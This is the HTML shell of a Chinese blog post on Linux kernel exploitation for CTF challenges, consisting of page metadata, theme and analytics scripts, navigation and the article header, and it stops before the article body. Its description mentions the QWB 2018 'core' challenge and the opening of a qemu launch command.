<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2023/10/16/深入理解pwn_kernel及相关例题/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="前言由于typora 编辑起来太卡了, 所以将基础部分已经迁移至《深入理解Pwn_Kernel基础篇》 内核栈利用QWB_2018_core题目分析start.sh 12345678qemu-system-x86_64 \	-m 128M \	-kernel .&#x2F;bzImage \	-initrd  .&#x2F;core.cpio \	-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw cons">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解Pwn_Kernel及相关例题">
<meta property="og:url" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="前言由于typora 编辑起来太卡了, 所以将基础部分已经迁移至《深入理解Pwn_Kernel基础篇》 内核栈利用QWB_2018_core题目分析start.sh 12345678qemu-system-x86_64 \	-m 128M \	-kernel .&#x2F;bzImage \	-initrd  .&#x2F;core.cpio \	-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw cons">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/smep.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905115129293.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240906090938018.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240410172028837.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905101112480.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir2.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240922171025707.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010143715739.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/9238c63e2b3ebdb287ce19b0dd2c8d24.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/5342f92979ae7f588c2058a4d2144d8b.gif">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/26f0aa72bd11390b7b9790c1fa7cffe9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7c7268c0160ec64d50ada5c1787f789f.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18766f6b9f8a4dd92bab29f062fa6a7a.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18a655483165c8fc681c3e8dbf16c645.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010203455359.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE-1733799601040-1.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/79biltjNfACIZcP.gif">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/pqLSVaINQ3zAsmO.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT-1734073220227-1.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/i4C7oOvHdG2RqUm.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7iQO1b64XNaTkG8.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/e2LRJKzQVYSTO5k.png">
<meta property="article:published_time" content="2023-10-16T12:15:29.000Z">
<meta property="article:modified_time" content="2025-12-18T11:08:07.454Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Pwn_Kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/smep.jpg">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            深入理解Pwn_Kernel及相关例题 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"github":"https://github.com/jelasin","看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/jelasin">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/jelasin">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">135</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">深入理解Pwn_Kernel及相关例题</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-10-16 20:15:29</span>
        <span class="mobile">2023-10-16 20:15:29</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-12-18 19:08:07</span>
            <span class="mobile">2025-12-18 19:08:07</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/CTF/">CTF</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
